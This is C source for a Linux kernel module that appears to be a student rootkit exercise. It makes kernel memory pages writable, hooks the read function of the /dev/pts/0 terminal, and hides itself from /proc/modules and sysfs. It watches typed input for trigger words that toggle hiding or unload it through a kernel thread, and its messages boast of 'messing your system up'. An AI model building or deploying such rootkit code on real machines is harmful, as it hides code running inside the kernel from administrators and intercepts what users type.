#include <linux/moduleloader.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/reboot.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific
#include <linux/delay.h>
#include <linux/syscalls.h> // for filp_open
#include <linux/async.h>
#include <linux/kmemleak.h>
#include <linux/kthread.h>
#include <linux/kobject.h>

#include <linux/vmalloc.h>
/* If this is set, the section belongs in the init part of the module */
#define INIT_OFFSET_MASK (1UL << (BITS_PER_LONG-1))

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module: "

atomic_t in_orig_syscall = ATOMIC_INIT(0);

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap
static ssize_t (*old_tty_read) (struct file *, char *, size_t, loff_t *);
LIST_HEAD(hidden_modules);
struct list_head *modules;
struct kobj_type *ktype;
int z = 0;
bool hidden = false;

void hide_module(void) {

	struct module* mod;
//	struct module* newmod;

	mod = &__this_module; //find_module("hide_module");
	modules = mod->list.prev;
	// remove from /proc/modules
	list_del(&mod->list);
	// remove from /sys/modules
	kobject_del(&mod->mkobj.kobj);

	//mod->sect_atts = NULL;
	//mod->notes_atts = NULL;
	
	list_add(&mod->list, &hidden_modules);
	hidden = true;
	
//	newmod = move_module_somewhere_else(mod);
	printk("shuld be unloaded but still running \n");
}


/* Free a module, remove from lists, etc. */
static void free_module(struct module *mod)
{
	//trace_module_free(mod);

	//mod_sysfs_teardown(mod);

	/* We leave it in list to prevent duplicate loads, but make sure
	 * that noone uses it while it's being deconstructed. */
	mutex_lock(&module_mutex);
	mod->state = MODULE_STATE_UNFORMED;
	mutex_unlock(&module_mutex);

	/* Remove dynamic debug info */
	ddebug_remove_module(mod->name);

	/* Arch-specific cleanup. */
	//module_arch_cleanup(mod);

	/* Module unload stuff */
	//module_unload_free(mod);

	/* Free any allocated parameters. */
	//destroy_params(mod->kp, mod->num_kp);

	/* Now we can delete it from the lists */
	mutex_lock(&module_mutex);
	/* Unlink carefully: kallsyms could be walking list. */
	list_del_rcu(&mod->list);
	//mod_tree_remove(mod);
	/* Remove this module from bug list, this uses list_del_rcu */
	//module_bug_cleanup(mod);
	/* Wait for RCU-sched synchronizing before releasing mod->list and buglist. */
	synchronize_sched();
	mutex_unlock(&module_mutex);

	/* This may be NULL, but that's OK */
	//unset_module_init_ro_nx(mod);
	//module_arch_freeing_init(mod);
	//module_memfree(mod->module_init);
	kfree(mod->args);
	//percpu_modfree(mod);

	/* Free lock-classes; relies on the preceding sync_rcu(). */
	lockdep_free_key_range(mod->module_core, mod->core_size);

	/* Finally, free the core (containing the module structure) */
	//unset_module_core_ro_nx(mod);
	//module_memfree(mod->module_core);

#ifdef CONFIG_MPU
	update_protections(current->mm);
#endif
}

int unload_thread(void *vmod) {

	struct module* mod = (struct module*) vmod;
	mod->exit();
	//blocking_notifier_call_chain(&module_notify_list,
	//		MODULE_STATE_GOING, mod);
	async_synchronize_full();

	/* Store the name of the last unloaded module for diagnostic purposes */
	//strlcpy(last_unloaded_module, mod->name, sizeof(last_unloaded_module));

	free_module(mod);
	printk("Walle done...\n");
	do_exit(0);
}
void unload(void) {
	// Start Walle, the Thread to clean up my mess
	kthread_run(&unload_thread,(void *) &__this_module, "Walle");
}

void show_module(void) {

	struct module *mod;
	int ret;
	mod = &__this_module; //find_module("hide_module");
	printk("this method would normally show the module\n");
	list_add(&mod->list, modules);
	//kobjct_add(&mod->mkobj.kobj);
	//mod->mkobj.kobj = *kobject_create_and_add(mod
	ret = kobject_add(&mod->mkobj.kobj, NULL, "%s", mod->name);
	mod->holders_dir = kobject_create_and_add("holders", &mod->mkobj.kobj);
	hidden = false;
}
 
 /* Make the page writable */ 
int make_rw(unsigned long address) 
{ 
	unsigned int level; 
	pte_t *pte = lookup_address(address, &level); 
	if(pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW; 
	return 0; 
} 

/* Make the page write protected */ 
int make_ro(unsigned long address) 
{   
	unsigned int level; 
	pte_t *pte = lookup_address(address, &level); 
	pte->pte = pte->pte &~ _PAGE_RW; 
	return 0; 
} 

static ssize_t new_tty_read(struct file * file, char * buf, size_t count, loff_t *ppos) {
	ssize_t ret;
	atomic_inc(&in_orig_syscall); 
	ret = old_tty_read(file, buf, count, ppos);
	//	printk("readTTY: %s\n",buf);

	switch(z) {		// search for input pattern
		case 0:
			if(buf[0] == 'p') {
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 1:
			if(buf[0] == 'i'){
				z=2;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 2:
			if(buf[0] == 'n'){
				z=3;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 3:
			if(buf[0] == 'g'){
				printk("pong\n");
				z=0;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 10:
			if(buf[0] == 'h'){
				z=11;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 11:
			if(buf[0] == 'o'){
				z=12;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;
		case 12:
			if(buf[0] == 'w'){
				if(hidden){
					printk("AAaaaarrrg... You hit my Keyword!! My only weak spot...\n");
					//show_module();
					unload();
				}
				else{
					printk("By By, see you when I'm done messing your system up! #evil\n");
					hide_module();
				}
				z=0;
			}
			else if(buf[0] == 'p'){
				z=1;
			}
			else if(buf[0] == 's'){
				z=10;
			}
			else z=0;
			break;

	}
	atomic_dec(&in_orig_syscall);
	return ret;

}

//static struct file_operations old_tty_fops;
//static struct file_operations new_tty_fops;

static int __init init_mod(void)
{	
//static ssize_t (*old_tty_read) (struct file *, char *, size_t, loff_t *);

	ssize_t (**tty_read_func_pointer) (struct file *, char *, size_t, loff_t *);
	struct file* file;
	printk("inserting...\n");

	file = filp_open("/dev/pts/0", O_RDONLY, 0);
	old_tty_read = file->f_op->read;
	tty_read_func_pointer = &(file->f_op->read);
	/*old_tty_fops = {
			llseek:     file->f_op->llseek,
			read:       file->f_op->read,
			write:      file->f_op->write,
			poll:       file->f_op->poll,
			ioctl:      file->f_op->ioctl,
			open:       file->f_op->open,
			release:    file->f_op->release,
			fasync:     file->f_op->fasync,
	};*/
	
	//new_tty_fops = {
	/*struct file_operations new_tty_fops = {	
			llseek:     file->f_op->llseek,
			read:       new_tty_read,
			write:      file->f_op->write,
			poll:       file->f_op->poll,
			//ioctl:      file->f_op->ioctl,
			open:       file->f_op->open,
			release:    file->f_op->release,
			fasync:     file->f_op->fasync,
	};*/
	
	make_rw((unsigned long) tty_read_func_pointer);
	*tty_read_func_pointer = new_tty_read;
	make_ro((unsigned long) tty_read_func_pointer);
	
	filp_close(file,NULL);
	hide_module();
	return 0;
}

static void __exit  exit_mod(void)
{
	ssize_t (**tty_read_func_pointer) (struct file *, char *, size_t, loff_t *);
	struct file* file;
	printk("exiting...\n");
	
	file = filp_open("/dev/pts/0", O_RDONLY, 0);
	tty_read_func_pointer = &(file->f_op->read);
	make_rw((unsigned long) tty_read_func_pointer);
	*tty_read_func_pointer = old_tty_read;
	make_ro((unsigned long) tty_read_func_pointer);
	filp_close(file,NULL);
	
	
	if(atomic_read(&in_orig_syscall)!=0) 
		printk("waiting for instance to be finished\n");
	while(atomic_read(&in_orig_syscall)!=0){
		msleep(10);
	}
	printk("done...\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */





/*

struct module* move_module_somewhere_else(struct module* mod){
	//struct module* newmod;
	int i;
	void* ptr;

	//newmod = kmalloc(mod->core_size);	// kernel uses vmalloc_exec(size) in move_module
	ptr = vmalloc_exec(mod->core_size);
	kmemleak_not_leak(ptr);
	memset(ptr, 0, mod->core_size);
	mod->module_core = ptr;

*/



/*
	if (mod->init_size) {
		ptr = module_alloc(mod->init_size);
		 // The pointer to this block is stored in the module structure
		 // which is inside the block. This block doesn't need to be
		 // scanned as it contains data and code that will be freed
		 // after the module is initialized.
		kmemleak_ignore(ptr);
		if (!ptr) {
			module_memfree(mod->module_core);
			return -ENOMEM;
		}
		memset(ptr, 0, mod->init_size);
		mod->module_init = ptr;
	} else
		mod->module_init = NULL;
*/
/*
	// Transfer each section which specifies SHF_ALLOC	
	pr_debug("final section addresses:\n");
	for (i = 0; i < info->hdr->e_shnum; i++) {
		void *dest;
		Elf_Shdr *shdr = &info->sechdrs[i];

		if (!(shdr->sh_flags & SHF_ALLOC))
			continue;

		if (shdr->sh_entsize & INIT_OFFSET_MASK)
			dest = mod->module_init
				+ (shdr->sh_entsize & ~INIT_OFFSET_MASK);
		else
			dest = mod->module_core + shdr->sh_entsize;

		if (shdr->sh_type != SHT_NOBITS)
			memcpy(dest, (void *)shdr->sh_addr, shdr->sh_size);
		// Update sh_addr to point to copy in image. 
		shdr->sh_addr = (unsigned long)dest;
		pr_debug("\t0x%lx %s\n",
				(long)shdr->sh_addr, info->secstrings + shdr->sh_name);
	}
return mod;
}
*/

/*
void set_page_attributes(void *start, void *end, int (*set)(unsigned long start, int num_pages))
{
	unsigned long begin_pfn = PFN_DOWN((unsigned long)start);
	unsigned long end_pfn = PFN_DOWN((unsigned long)end);

	if (end_pfn > begin_pfn)
		set(begin_pfn << PAGE_SHIFT, end_pfn - begin_pfn);
}

static void unset_module_core_ro_nx(struct module *mod)
{
	set_page_attributes(mod->module_core + mod->core_text_size,
			mod->module_core + mod->core_size,
			SM_set_memory_x);
	set_page_attributes(mod->module_core,
			mod->module_core + mod->core_ro_size,
			SM_set_memory_rw);
}

static void unset_module_init_ro_nx(struct module *mod)
{
	set_page_attributes(mod->module_init + mod->init_text_size,
			mod->module_init + mod->init_size,
			SM_set_memory_x);
	set_page_attributes(mod->module_init,
			mod->module_init + mod->init_ro_size,
			SM_set_memory_rw);
}

static void module_unload_free(struct module *mod)
{
	struct module_use *use, *tmp;

	mutex_lock(&module_mutex);
	list_for_each_entry_safe(use, tmp, &mod->target_list, target_list) {
		struct module *i = use->target;
		pr_debug("%s unusing %s\n", mod->name, i->name);
		module_put(i);
		list_del(&use->source_list);
		list_del(&use->target_list);
		((void (*)(const void*))SM_kfree)(use);
	}
	mutex_unlock(&module_mutex);
}


	
static noinline void __mod_tree_insert(struct mod_tree_node *node)
{
	latch_tree_insert(&node->node, &mod_tree.root, &mod_tree_ops);
}

static void __mod_tree_remove(struct mod_tree_node *node)
{
	latch_tree_erase(&node->node, &mod_tree.root, &mod_tree_ops);
}



static void mod_tree_remove_init(struct module *mod)
{
	if (mod->init_size)
		__mod_tree_remove(&mod->mtn_init);
}

static void mod_tree_remove(struct module *mod)
{
	__mod_tree_remove(&mod->mtn_core);
	mod_tree_remove_init(mod);
}
*/

/*
static void free_module_modifyed(struct module *mod)
{
	//trace_module_free(mod);

	//mod_sysfs_teardown(mod);

//	 We leave it in list to prevent duplicate loads, but make sure
//	 * that noone uses it while it's being deconstructed. 
	mutex_lock(&module_mutex);
	mod->state = MODULE_STATE_UNFORMED;
	mutex_unlock(&module_mutex);

	// Remove dynamic debug info 
	ddebug_remove_module(mod->name);

	// Arch-specific cleanup. 
	module_arch_cleanup(mod);

	// Module unload stuff 
	module_unload_free(mod);

	// Free any allocated parameters. 
	destroy_params(mod->kp, mod->num_kp);

	// Now we can delete it from the lists 
	mutex_lock(&module_mutex);
	// Unlink carefully: kallsyms could be walking list. 
	list_del_rcu(&mod->list);
//	mod_tree_remove(mod);
	// Remove this module from bug list, this uses list_del_rcu 
	module_bug_cleanup(mod);
	// Wait for RCU-sched synchronizing before releasing mod->list and buglist. 
	//synchronize_sched();
	mutex_unlock(&module_mutex);

	// This may be NULL, but that's OK 
	unset_module_init_ro_nx(mod);
	//module_arch_freeing_init(mod);
//	module_memfree(mod->module_init);
//	kfree(mod->args);
//	percpu_modfree(mod);

	// Free lock-classes; relies on the preceding sync_rcu(). 
	lockdep_free_key_range(mod->module_core, mod->core_size);

	// Finally, free the core (containing the module structure) 
	unset_module_core_ro_nx(mod);
	//module_memfree(mod->module_core);

#ifdef CONFIG_MPU
	update_protections(current->mm);
#endif
}
 */
